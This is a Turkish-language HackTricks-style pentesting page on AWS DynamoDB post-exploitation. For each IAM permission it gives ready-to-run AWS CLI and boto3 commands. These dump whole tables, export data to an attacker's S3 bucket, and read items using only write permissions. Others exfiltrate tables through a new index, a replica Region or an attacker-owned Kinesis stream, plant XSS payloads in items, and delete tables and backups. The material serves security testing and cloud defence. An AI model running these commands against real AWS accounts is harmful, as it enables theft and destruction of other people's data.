# AWS - DynamoDB Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## DynamoDB

Daha fazla bilgi için bakınız:

{{#ref}}
../../aws-services/aws-dynamodb-enum.md
{{#endref}}

### `dynamodb:BatchGetItem`

Bu izne sahip bir saldırgan, **tablolardan öğeleri birincil anahtar aracılığıyla alabilir** (tablonun tüm verilerini doğrudan isteyemezsiniz). Bu, birincil anahtarları bilmeniz gerektiği anlamına gelir (bunları tablo meta verilerini alarak elde edebilirsiniz (`describe-table`).

{{#tabs }}
{{#tab name="json file" }}
```bash
aws dynamodb batch-get-item --request-items file:///tmp/a.json

// With a.json
{
"ProductCatalog" : { // This is the table name
"Keys": [
{
"Id" : { // Primary keys name
"N": "205" // Value to search for, you could put here entries from 1 to 1000 to dump all those
}
}
]
}
}
```
{{#endtab }}

{{#tab name="inline" }}
```bash
aws dynamodb batch-get-item \
--request-items '{"TargetTable": {"Keys": [{"Id": {"S": "item1"}}, {"Id": {"S": "item2"}}]}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Potansiyel Etki:** Tablo içindeki hassas bilgileri bularak dolaylı privesc

### `dynamodb:GetItem`

**Önceki izinlere benzer şekilde** bu izin, potansiyel bir saldırıcının alınacak girdinin birincil anahtarı verildiğinde yalnızca 1 tablodan değerleri okumasına izin verir:
```json
aws dynamodb get-item --table-name ProductCatalog --key  file:///tmp/a.json

// With a.json
{
"Id" : {
"N": "205"
}
}
```
Bu izinle ayrıca **`transact-get-items`** yöntemini şöyle kullanmak da mümkün:
```json
aws dynamodb transact-get-items \
--transact-items file:///tmp/a.json

// With a.json
[
{
"Get": {
"Key": {
"Id": {"N": "205"}
},
"TableName": "ProductCatalog"
}
}
]
```
**Olası Etki:** Tabloda hassas bilgileri bularak dolaylı privesc

### `dynamodb:Query`

**Önceki izinlere benzer şekilde** bu izin, bir girdinin birincil anahtarı verildiğinde potansiyel bir saldırıcının sadece tek bir tablodan değerleri okumasına izin verir. [subset of comparisons](https://docs.aws.amazon.com/amazondynamodb/latest/APIReference/API_Condition.html) kullanmasına izin verir, fakat birincil anahtarla (mutlaka bulunması gereken) yapılabilecek tek karşılaştırma "EQ"dir, bu yüzden bir karşılaştırma kullanarak tüm veritabanını bir istekte alamazsınız.

{{#tabs }}
{{#tab name="json file" }}
```bash
aws dynamodb query --table-name ProductCatalog --key-conditions file:///tmp/a.json

// With a.json
{
"Id" : {
"ComparisonOperator":"EQ",
"AttributeValueList": [ {"N": "205"} ]
}
}
```
{{#endtab }}

{{#tab name="inline" }}
```bash
aws dynamodb query \
--table-name TargetTable \
--key-condition-expression "AttributeName = :value" \
--expression-attribute-values '{":value":{"S":"TargetValue"}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Olası Etki:** Dolaylı privesc — tabloda hassas bilgileri bularak

### `dynamodb:Scan`

Bu izni kullanarak **tüm tabloyu kolayca dump edebilirsiniz**.
```bash
aws dynamodb scan --table-name <t_name> #Get data inside the table
```
**Potansiyel Etki:** Tablodaki hassas bilgileri bularak dolaylı privesc

### `dynamodb:PartiQLSelect`

Bu izni **tüm tabloyu kolayca dökmek** için kullanabilirsiniz.
```bash
aws dynamodb execute-statement \
--statement "SELECT * FROM ProductCatalog"
```
Bu izin ayrıca `batch-execute-statement` gibi işlemleri gerçekleştirmeye de izin verir:
```bash
aws dynamodb batch-execute-statement \
--statements '[{"Statement": "SELECT * FROM ProductCatalog WHERE Id = 204"}]'
```
ama primary key için bir değer belirtmeniz gerekiyor, bu yüzden çok kullanışlı değil.

**Olası Etki:** Tablodaki hassas bilgileri bularak dolaylı privesc

### `dynamodb:ExportTableToPointInTime|(dynamodb:UpdateContinuousBackups)`

Bu izin, bir saldırganın tablonun tamamını seçtiği bir S3 bucket'a **aktarmasına** izin verir:
```bash
aws dynamodb export-table-to-point-in-time \
--table-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable \
--s3-bucket <attacker_s3_bucket> \
--s3-prefix <optional_prefix> \
--export-time <point_in_time> \
--region <region>
```
Bunun çalışması için tablonun point-in-time-recovery etkinleştirilmiş olması gerektiğini unutmayın; tablonun bunu içerip içermediğini şu komutla kontrol edebilirsiniz:
```bash
aws dynamodb describe-continuous-backups \
--table-name <tablename>
```
Etkin değilse, **etkinleştirmeniz** gerekecek ve bunun için **`dynamodb:ExportTableToPointInTime`** iznine ihtiyacınız olacak:
```bash
aws dynamodb update-continuous-backups \
--table-name <value> \
--point-in-time-recovery-specification PointInTimeRecoveryEnabled=true
```
**Potansiyel Etki:** Tablo içinde hassas bilgileri bularak dolaylı privesc

### `dynamodb:CreateTable`, `dynamodb:RestoreTableFromBackup`, (`dynamodb:CreateBackup)` 

Bu izinlerle, bir saldırgan **yedekten yeni bir tablo oluşturmak** (veya hatta daha sonra farklı bir tabloda geri yüklemek için bir yedek oluşturmak) gibi işlemleri gerçekleştirebilir. Daha sonra, gerekli izinlerle, yedeklerden **üretim tablosunda artık bulunmayan** **bilgileri** inceleyebilecektir.
```bash
aws dynamodb restore-table-from-backup \
--backup-arn <source-backup-arn> \
--target-table-name <new-table-name> \
--region <region>
```
**Potential Impact:** Tablo yedeklerinde hassas bilgileri bularak dolaylı privesc

### `dynamodb:PutItem`

Bu izin, kullanıcılara tabloya **yeni bir öğe ekleme veya var olan bir öğeyi yeni bir öğe ile değiştirme** imkanı verir. Aynı birincil anahtara sahip bir öğe zaten varsa, **tüm öğe yeni öğe ile değiştirilecektir**. Eğer birincil anahtar mevcut değilse, belirtilen birincil anahtara sahip yeni bir öğe **oluşturulacaktır**.

{{#tabs }}
{{#tab name="XSS Example" }}
```bash
## Create new item with XSS payload
aws dynamodb put-item --table <table_name> --item file://add.json
### With add.json:
{
"Id": {
"S": "1000"
},
"Name": {
"S":  "Marc"
},
"Description": {
"S": "<script>alert(1)</script>"
}
}
```
{{#endtab }}

{{#tab name="AI Example" }}
```bash
aws dynamodb put-item \
--table-name ExampleTable \
--item '{"Id": {"S": "1"}, "Attribute1": {"S": "Value1"}, "Attribute2": {"S": "Value2"}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Potansiyel Etki:** DynamoDB tablosuna veri ekleyip/değiştirerek ek güvenlik açıklarının/atlatmaların istismarı

### `dynamodb:UpdateItem`

Bu izin, kullanıcılara bir öğenin mevcut özniteliklerini değiştirme veya bir öğeye yeni öznitelikler ekleme yetkisi verir. Tüm öğeyi değiştirmez; yalnızca belirtilen öznitelikleri günceller. Eğer tabloda birincil anahtar yoksa, işlem belirtilen birincil anahtarla yeni bir öğe oluşturur ve güncelleme ifadesinde belirtilen öznitelikleri ayarlar.

{{#tabs }}
{{#tab name="XSS Example" }}
```bash
## Update item with XSS payload
aws dynamodb update-item --table <table_name> \
--key file://key.json --update-expression "SET Description = :value" \
--expression-attribute-values file://val.json
### With key.json:
{
"Id": {
"S": "1000"
}
}
### and val.json
{
":value": {
"S": "<script>alert(1)</script>"
}
}
```
{{#endtab }}

{{#tab name="AI Example" }}
```bash
aws dynamodb update-item \
--table-name ExampleTable \
--key '{"Id": {"S": "1"}}' \
--update-expression "SET Attribute1 = :val1, Attribute2 = :val2" \
--expression-attribute-values '{":val1": {"S": "NewValue1"}, ":val2": {"S": "NewValue2"}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Potansiyel Etki:** Bir DynamoDB tablosuna veri ekleyip/değiştirilebilmesiyle ilave vulnerabilities/bypasses istismarı

### `dynamodb:DeleteTable`

Bu izne sahip bir saldırgan bir DynamoDB tablosunu **silebilir, veri kaybına neden olur**.
```bash
aws dynamodb delete-table \
--table-name TargetTable \
--region <region>
```
**Olası etki**: Veri kaybı ve silinen tabloya bağlı hizmetlerin aksaması.

### `dynamodb:DeleteBackup`

Bu izne sahip bir saldırgan **bir DynamoDB yedeğini silebilir; bu da olası bir felaket kurtarma senaryosunda veri kaybına neden olabilir**.
```bash
aws dynamodb delete-backup \
--backup-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable/backup/BACKUP_ID \
--region <region>
```
**Olası etki**: Veri kaybı ve bir felaket kurtarma senaryosunda yedekten geri yükleyememe.

### `dynamodb:StreamSpecification`, `dynamodb:UpdateTable`, `dynamodb:DescribeStream`, `dynamodb:GetShardIterator`, `dynamodb:GetRecords`

> [!NOTE]
> TODO: Bunun gerçekten çalışıp çalışmadığını test et

Bu izinlere sahip bir saldırgan DynamoDB tablosunda bir stream etkinleştirebilir, tabloyu değişikliklerin stream edilmesine başlamak için güncelleyebilir ve ardından tablo değişikliklerini gerçek zamanlı izlemek için stream'e erişebilir. Bu, saldırganın veri değişikliklerini izleyip exfiltrate etmesine ve potansiyel olarak data leakage ile sonuçlanmasına olanak tanır.

1. DynamoDB tablosunda bir stream etkinleştirin:
```bash
aws dynamodb update-table \
--table-name TargetTable \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES \
--region <region>
```
2. ARN ve diğer ayrıntıları elde etmek için stream'i açıklayın:
```bash
aws dynamodb describe-stream \
--table-name TargetTable \
--region <region>
```
3. Stream ARN kullanarak shard iterator'ı al:
```bash
aws dynamodbstreams get-shard-iterator \
--stream-arn <stream_arn> \
--shard-id <shard_id> \
--shard-iterator-type LATEST \
--region <region>
```
4. Shard iterator'ı kullanarak stream'den verilere erişin ve verileri exfiltrate edin:
```bash
aws dynamodbstreams get-records \
--shard-iterator <shard_iterator> \
--region <region>
```
**Potansiyel etki**: DynamoDB tablosunun değişikliklerinin gerçek zamanlı izlenmesi ve veri leak'i.

### `dynamodb:UpdateItem` ve `ReturnValues=ALL_OLD` ile öğeleri okuma

Tablo üzerinde yalnızca `dynamodb:UpdateItem` iznine sahip bir saldırgan, zararsız bir güncelleme yapıp `--return-values ALL_OLD` isteyerek normal okuma izinleri (`GetItem`/`Query`/`Scan`) olmadan öğeleri okuyabilir. DynamoDB, yanıtın `Attributes` alanında öğenin güncelleme öncesi tam görüntüsünü döndürecektir (bu, RCUs tüketmez).

- Gerekli minimum izinler: `dynamodb:UpdateItem` hedef tablo/anahtar üzerinde.
- Önkoşullar: Öğenin birincil anahtarını bilmeniz gerekir.

Örnek (zararsız bir attribute ekler ve yanıt içinde önceki öğeyi exfiltrates):
```bash
aws dynamodb update-item \
--table-name <TargetTable> \
--key '{"<PKName>":{"S":"<PKValue>"}}' \
--update-expression 'SET #m = :v' \
--expression-attribute-names '{"#m":"exfil_marker"}' \
--expression-attribute-values '{":v":{"S":"1"}}' \
--return-values ALL_OLD \
--region <region>
```
CLI yanıtı, önceki öğenin tamamını içeren bir `Attributes` bloğu (tüm öznitelikler) içerecek; bu, yalnızca yazma erişiminden read primitive sağlamış olur.

**Potential Impact:** Yalnızca yazma izinleriyle bir tablodan rastgele öğeler okunabilir; primary key'ler bilindiğinde hassas verilerin exfiltration yoluyla sızdırılmasına olanak tanır.


### `dynamodb:UpdateTable (replica-updates)` | `dynamodb:CreateTableReplica`

Bir DynamoDB Global Table'a (version 2019.11.21) yeni bir bölgesel replica Region ekleyerek stealth exfiltration gerçekleştirilebilir. Eğer bir principal bölgesel bir replica ekleyebiliyorsa, tüm tablo saldırganın seçtiği Region'a replike edilir ve saldırgan o Region'dan tüm öğeleri okuyabilir.

{{#tabs }}
{{#tab name="PoC (default DynamoDB-managed KMS)" }}
```bash
# Add a new replica Region (from primary Region)
aws dynamodb update-table \
--table-name <TableName> \
--replica-updates '[{"Create": {"RegionName": "<replica-region>"}}]' \
--region <primary-region>

# Wait until the replica table becomes ACTIVE in the replica Region
aws dynamodb describe-table --table-name <TableName> --region <replica-region> --query 'Table.TableStatus'

# Exfiltrate by reading from the replica Region
aws dynamodb scan --table-name <TableName> --region <replica-region>
```
{{#endtab }}
{{#tab name="PoC (customer-managed KMS)" }}
```bash
# Specify the CMK to use in the replica Region
aws dynamodb update-table \
--table-name <TableName> \
--replica-updates '[{"Create": {"RegionName": "<replica-region>", "KMSMasterKeyId": "arn:aws:kms:<replica-region>:<account-id>:key/<cmk-id>"}}]' \
--region <primary-region>
```
{{#endtab }}
{{#endtabs }}

İzinler: `dynamodb:UpdateTable` (ile `replica-updates`) veya hedef tablo üzerinde `dynamodb:CreateTableReplica`. Replica'da CMK kullanılıyorsa, o anahtar için KMS izinleri gerekebilir.

Olası Etki: Saldırgan tarafından kontrol edilen bir bölgeye tüm tablo replikasyonu, bu da gizli veri sızdırılmasına yol açar.

### `dynamodb:TransactWriteItems` (başarısız koşul yoluyla okuma + `ReturnValuesOnConditionCheckFailure=ALL_OLD`)

Transaksiyonel yazma ayrıcalıklarına sahip bir saldırgan, `TransactWriteItems` içinde bir `Update` gerçekleştirip bilerek bir `ConditionExpression`'ı başarısız kılarak ve `ReturnValuesOnConditionCheckFailure=ALL_OLD` ayarlayarak mevcut bir öğenin tüm özniteliklerini dışarı çıkarabilir. Başarısızlık durumunda, DynamoDB önceki öznitelikleri işlem iptal sebeplerine dahil eder; bu da hedeflenen anahtarlar için yazma-erişimini fiilen okuma-erişimine çevirir.

{{#tabs }}
{{#tab name="PoC (AWS CLI >= supports cancellation reasons)" }}
```bash
# Create the transaction input (list form for --transact-items)
cat > /tmp/tx_items.json << 'JSON'
[
{
"Update": {
"TableName": "<TableName>",
"Key": {"<PKName>": {"S": "<PKValue>"}},
"UpdateExpression": "SET #m = :v",
"ExpressionAttributeNames": {"#m": "marker"},
"ExpressionAttributeValues": {":v": {"S": "x"}},
"ConditionExpression": "attribute_not_exists(<PKName>)",
"ReturnValuesOnConditionCheckFailure": "ALL_OLD"
}
}
]
JSON

# Execute. Newer AWS CLI versions support returning cancellation reasons
aws dynamodb transact-write-items \
--transact-items file:///tmp/tx_items.json \
--region <region> \
--return-cancellation-reasons
# The command fails with TransactionCanceledException; parse cancellationReasons[0].Item
```
{{#endtab }}
{{#tab name="PoC (boto3)" }}
```python
import boto3
c=boto3.client('dynamodb',region_name='<region>')
try:
c.transact_write_items(TransactItems=[{ 'Update': {
'TableName':'<TableName>',
'Key':{'<PKName>':{'S':'<PKValue>'}},
'UpdateExpression':'SET #m = :v',
'ExpressionAttributeNames':{'#m':'marker'},
'ExpressionAttributeValues':{':v':{'S':'x'}},
'ConditionExpression':'attribute_not_exists(<PKName>)',
'ReturnValuesOnConditionCheckFailure':'ALL_OLD'}}])
except c.exceptions.TransactionCanceledException as e:
print(e.response['CancellationReasons'][0]['Item'])
```
{{#endtab }}
{{#endtabs }}

İzinler: hedef tablo üzerinde `dynamodb:TransactWriteItems` (ve ilgili öğe). Okuma izni gerekli değildir.

Muhtemel Etki: Döndürülen iptal nedenleri aracılığıyla yalnızca işlemsel yazma ayrıcalıkları kullanarak bir tablodan (birincil anahtara göre) rastgele öğeleri okumak.


### `dynamodb:UpdateTable` + `dynamodb:UpdateItem` + `dynamodb:Query` GSI üzerinde

Okuma kısıtlamalarını aşmak için düşük entropili bir öznitelikte `ProjectionType=ALL` ile bir Global Secondary Index (GSI) oluşturun, bu özniteliği öğeler arasında sabit bir değere ayarlayın, sonra indeksi `Query` ile sorgulayarak tam öğeleri alın. Bu, temel tabloda `Query`/`Scan` reddedilmiş olsa bile, indeks ARN'sini sorgulayabildiğiniz sürece çalışır.

- Minimum izinler:
- Hedef tablo üzerinde `dynamodb:UpdateTable` (GSI'yi `ProjectionType=ALL` ile oluşturmak için).
- Hedef tablo anahtarları üzerinde `dynamodb:UpdateItem` (her öğede indekslenen özniteliği ayarlamak için).
- İndeks kaynak ARN'si üzerinde `dynamodb:Query` (`arn:aws:dynamodb:<region>:<account-id>:table/<TableName>/index/<IndexName>`).

Adımlar (PoC us-east-1'de):
```bash
# 1) Create table and seed items (without the future GSI attribute)
aws dynamodb create-table --table-name HTXIdx \
--attribute-definitions AttributeName=id,AttributeType=S \
--key-schema AttributeName=id,KeyType=HASH \
--billing-mode PAY_PER_REQUEST --region us-east-1
aws dynamodb wait table-exists --table-name HTXIdx --region us-east-1
for i in 1 2 3 4 5; do \
aws dynamodb put-item --table-name HTXIdx \
--item "{\"id\":{\"S\":\"$i\"},\"secret\":{\"S\":\"sec-$i\"}}" \
--region us-east-1; done

# 2) Add GSI on attribute X with ProjectionType=ALL
aws dynamodb update-table --table-name HTXIdx \
--attribute-definitions AttributeName=X,AttributeType=S \
--global-secondary-index-updates '[{"Create":{"IndexName":"ExfilIndex","KeySchema":[{"AttributeName":"X","KeyType":"HASH"}],"Projection":{"ProjectionType":"ALL"}}}]' \
--region us-east-1
# Wait for index to become ACTIVE
aws dynamodb describe-table --table-name HTXIdx --region us-east-1 \
--query 'Table.GlobalSecondaryIndexes[?IndexName==`ExfilIndex`].IndexStatus'

# 3) Set X="dump" for each item (only UpdateItem on known keys)
for i in 1 2 3 4 5; do \
aws dynamodb update-item --table-name HTXIdx \
--key "{\"id\":{\"S\":\"$i\"}}" \
--update-expression 'SET #x = :v' \
--expression-attribute-names '{"#x":"X"}' \
--expression-attribute-values '{":v":{"S":"dump"}}' \
--region us-east-1; done

# 4) Query the index by the constant value to retrieve full items
aws dynamodb query --table-name HTXIdx --index-name ExfilIndex \
--key-condition-expression '#x = :v' \
--expression-attribute-names '{"#x":"X"}' \
--expression-attribute-values '{":v":{"S":"dump"}}' \
--region us-east-1
```
**Potential Impact:** Yeni oluşturulan ve tüm öznitelikleri projekte eden bir GSI sorgulanarak tablonun tamamının exfiltration'ı, temel tablo okuma API'leri engellense bile.


### `dynamodb:EnableKinesisStreamingDestination` (Kinesis Data Streams üzerinden sürekli exfiltration)

DynamoDB Kinesis streaming destinations'ı kötüye kullanarak bir tablodaki değişiklikleri saldırganın kontrolündeki bir Kinesis Data Stream'e sürekli olarak exfiltrate etmek. Etkinleştirildiğinde, her INSERT/MODIFY/REMOVE olayı tabloyu okumaya yönelik izinlere ihtiyaç duymadan neredeyse gerçek zamanlı olarak stream'e iletilir.

Minimum izinler (saldırgan):
- `dynamodb:EnableKinesisStreamingDestination` hedef tabloda
- Opsiyonel olarak `dynamodb:DescribeKinesisStreamingDestination`/`dynamodb:DescribeTable` durumu izlemek için
- Kayıtları tüketmek için saldırganın sahip olduğu Kinesis stream üzerinde okuma izinleri: `kinesis:*`

<details>
<summary>PoC (us-east-1)</summary>
```bash
# 1) Prepare: create a table and seed one item
aws dynamodb create-table --table-name HTXKStream \
--attribute-definitions AttributeName=id,AttributeType=S \
--key-schema AttributeName=id,KeyType=HASH \
--billing-mode PAY_PER_REQUEST --region us-east-1
aws dynamodb wait table-exists --table-name HTXKStream --region us-east-1
aws dynamodb put-item --table-name HTXKStream \
--item file:///tmp/htx_item1.json --region us-east-1
# /tmp/htx_item1.json
# {"id":{"S":"a1"},"secret":{"S":"s-1"}}

# 2) Create attacker Kinesis Data Stream
aws kinesis create-stream --stream-name htx-ddb-exfil --shard-count 1 --region us-east-1
aws kinesis wait stream-exists --stream-name htx-ddb-exfil --region us-east-1

# 3) Enable the DynamoDB -> Kinesis streaming destination
STREAM_ARN=$(aws kinesis describe-stream-summary --stream-name htx-ddb-exfil \
--region us-east-1 --query StreamDescriptionSummary.StreamARN --output text)
aws dynamodb enable-kinesis-streaming-destination \
--table-name HTXKStream --stream-arn "$STREAM_ARN" --region us-east-1
# Optionally wait until ACTIVE
aws dynamodb describe-kinesis-streaming-destination --table-name HTXKStream \
--region us-east-1 --query KinesisDataStreamDestinations[0].DestinationStatus

# 4) Generate changes on the table
aws dynamodb put-item --table-name HTXKStream \
--item file:///tmp/htx_item2.json --region us-east-1
# /tmp/htx_item2.json
# {"id":{"S":"a2"},"secret":{"S":"s-2"}}
aws dynamodb update-item --table-name HTXKStream \
--key file:///tmp/htx_key_a1.json \
--update-expression "SET #i = :v" \
--expression-attribute-names {#i:info} \
--expression-attribute-values {:v:{S:updated}} \
--region us-east-1
# /tmp/htx_key_a1.json -> {"id":{"S":"a1"}}

# 5) Consume from Kinesis to observe DynamoDB images
SHARD=$(aws kinesis list-shards --stream-name htx-ddb-exfil --region us-east-1 \
--query Shards[0].ShardId --output text)
IT=$(aws kinesis get-shard-iterator --stream-name htx-ddb-exfil --shard-id "$SHARD" \
--shard-iterator-type TRIM_HORIZON --region us-east-1 --query ShardIterator --output text)
aws kinesis get-records --shard-iterator "$IT" --limit 10 --region us-east-1 > /tmp/krec.json
# Decode one record (Data is base64-encoded)
jq -r .Records[0].Data /tmp/krec.json | base64 --decode | jq .

# 6) Cleanup (recommended)
aws dynamodb disable-kinesis-streaming-destination \
--table-name HTXKStream --stream-arn "$STREAM_ARN" --region us-east-1 || true
aws kinesis delete-stream --stream-name htx-ddb-exfil --enforce-consumer-deletion --region us-east-1 || true
aws dynamodb delete-table --table-name HTXKStream --region us-east-1 || true
```
</details>

**Potansiyel Etki:** Sürekli, neredeyse gerçek zamanlı olarak tablo değişikliklerinin, tabloda doğrudan okuma işlemi yapılmaksızın saldırganın kontrolündeki Kinesis stream'ine exfiltration yapılması.

{{#include ../../../../banners/hacktricks-training.md}}
